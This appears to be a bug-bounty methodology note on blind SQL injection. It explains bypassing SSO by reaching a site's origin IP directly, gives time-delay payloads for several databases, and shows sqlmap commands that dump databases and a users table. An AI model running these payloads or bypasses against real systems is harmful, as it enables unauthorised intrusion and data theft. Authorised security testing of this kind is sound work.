---
type: pattern
title: Pattern - Blind SQL Injection
tags: [pattern, sqli, blind-sqli, origin-ip, sso-bypass, bb-pattern]
status: active
vuln_class: sqli
last_updated: 2026-04-11
sources:
  - https://medium.com/@mrx_w_/how-i-discovered-a-blind-sql-injection-in-a-private-program-7eebd77ad286
---

# Pattern: Blind SQL Injection (Time-Delay Confirmation + Infrastructure Bypass of SSO)

> The target is usually protected by SSO, but an internal admin or legacy page behind it may not be. Find a way to bypass SSO at the DNS/infrastructure layer, then run a time-delay injection against the raw POST parameters.

## Core Flow

```
Subdomain enumeration
  → Target is protected by SSO (403 or redirect)
  → Look up the origin IP via SecurityTrails
  → Access the origin IP directly, find an unprotected admin/editor endpoint
  → Test POST parameters
  → Confirm SQLi via time-delay injection
  → Extract the database with sqlmap
```

## Step 1: Bypass SSO by Finding the Origin IP

When the target domain is protected by a WAF/SSO, look for the origin IP:

```bash
# Use SecurityTrails or Shodan to find historical IPs
# SecurityTrails API
curl "https://api.securitytrails.com/v1/history/{domain}/dns/a" \
  -H "APIKEY: {your_key}" | jq '.records[].values[].ip'

# Shodan
shodan search "hostname:target.com" --fields ip_str,port,org

# Access the origin IP directly (bypassing CDN/SSO)
curl -H "Host: target.example.com" http://ORIGIN_IP/
```

**Why this works**: CDN and SSO are application-layer protections; the origin server itself may not enforce the same checks. The origin IP is commonly exposed via:
- Historical DNS A records (SecurityTrails, PassiveTotal)
- TLS certificate SAN entries (Censys)
- SMTP/MX records (if mail is hosted on the same IP)

## Step 2: Find POST Endpoints

Once you can reach the origin directly, look for:
- Forms accepting POST parameters like `id`, `user_id`, `asset_id`, `item_id`
- PHP pages (`.php` extension — historically higher SQLi prevalence)
- AJAX endpoints (`ajax/`, `api/`, `action=`)
- File-upload / editor features (usually reference an `id` parameter pointing to a DB record)

```bash
# Find hidden endpoints
feroxbuster -u http://ORIGIN_IP -H "Host: target.com" \
  -w /usr/share/wordlists/dirb/big.txt \
  -x php,aspx,jsp
```

## Step 3: Time-Delay Payload (Confirming Blind SQLi)

No need to see an error message or returned data — just observe **response time**:

```bash
# MySQL time-based payload
TIME_PAYLOAD="(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'\""+(select(0)from(select(sleep(6)))v)+\""*/"

# Test the asset_id parameter
curl -s -o /dev/null -w "%{time_total}" \
  -X POST http://ORIGIN_IP/email-asset-editor/ajax/saveChanges.php \
  -H "Host: target.com" \
  -d "asset_id=${TIME_PAYLOAD}&html_content=test&json_attributes={}"

# Normal response < 1s; SQLi confirmed if ≥ 5s
```

**Common sleep payloads:**

| DB | Payload |
|----|---------|
| **MySQL** | `' AND SLEEP(5)-- -` |
| **MySQL (filter bypass)** | `(select(0)from(select(sleep(5)))v)` |
| **MSSQL** | `'; WAITFOR DELAY '0:0:5'-- -` |
| **PostgreSQL** | `'; SELECT pg_sleep(5)-- -` |
| **Oracle** | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- -` |

## Step 4: Automated Extraction with sqlmap

**Best practice: save the request in Burp, then feed it to sqlmap**

```bash
# Step 1: intercept the request in Burp, right-click → Save Item → sqli.txt
# Example sqli.txt content:
# POST /email-asset-editor/ajax/saveChanges.php HTTP/1.1
# Host: target.example.com
# Content-Type: application/x-www-form-urlencoded
#
# asset_id=1&html_content=test&json_attributes={}

# Step 2: feed the request file directly to sqlmap (carries Host, Cookie, all headers automatically)
sqlmap -r sqli.txt --dbs

# Step 3: specify the injection point
sqlmap -r sqli.txt -p asset_id --dbs

# Step 4: force time-based blind technique + raise level
sqlmap -r sqli.txt -p asset_id \
  --technique=T \
  --time-sec=5 \
  --level=5 --risk=3 \
  --dbs

# Step 5: carry a Host header (bypass CDN, hit the origin IP directly)
# In sqli.txt, change the Host field to the IP and add X-Forwarded-Host: original-domain

# Dump a specific DB
sqlmap -r sqli.txt -D target_db --tables
sqlmap -r sqli.txt -D target_db -T users --dump
```

**Why `-r sqli.txt` instead of `-u`:**
- Automatically carries all headers (Cookie, Authorization, Content-Type)
- No need to manually specify `--data` and `--headers`
- A raw request saved from Burp is the most accurate reproduction

## Parameter Types Worth Extra Testing

| High-risk parameter | Reason |
|-----------|------|
| `asset_id`, `item_id`, `record_id` | DB primary keys, often passed directly into SQL |
| `order`, `sort`, `orderby` | Sort parameters are often concatenated straight into SQL |
| `search`, `q`, `keyword` | Search parameters are often built without prepared statements |
| `start`, `offset`, `page` | Pagination parameters — numeric type but still injectable |
| `format`, `type`, `category` | Category parameters are rarely tested |

## Special Note: PHP POST Parameters

A common vulnerable pattern in PHP applications:

```php
// Classic vulnerable pattern
$query = "SELECT * FROM assets WHERE id = " . $_POST['asset_id'];
// or
$query = "UPDATE assets SET html = '" . $_POST['html_content'] . "' WHERE id = " . $_POST['asset_id'];
```

POST body parameters are scanned by WAFs far less often than URL query strings.

## Severity

- **Blind SQLi → P1 (Critical)**
- If user data (email/hash) can be dumped → P1
- If RCE is achievable via `LOAD_FILE` / `INTO OUTFILE` → P1
- If it requires auth, severity may drop slightly, but is usually still P1

## Tools

| Tool | URL | Purpose |
|------|-----|------|
| **sqlmap** | https://github.com/sqlmapproject/sqlmap | Automated SQLi detection and extraction |
| **SecurityTrails** | https://securitytrails.com/ | Find origin IP, DNS history |
| **Shodan** | https://shodan.io/ | Find exposed origin servers |
| **Censys** | https://search.censys.io/ | SSL/TLS scanning to find origins |
| **feroxbuster** | https://github.com/epi052/feroxbuster | Directory brute-forcing |

## Related Patterns

- [[Pattern - SQL Injection]] — general SQLi methodology

### Related Concepts (external writeups)

- Source case study: mrx_w_'s Bugcrowd P1 writeup — the origin case for this pattern (SSO subdomain → SecurityTrails origin IP → `asset_id` time-based payload → sqlmap dumped 22 databases).
- A related writeup by Awais Nazeer shows the same SQL logic surfacing through a different injection point when a Burp scanner initially hit a WAF on GET and the cookie parameter was tried instead — cookie-based injection points are easy to overlook.
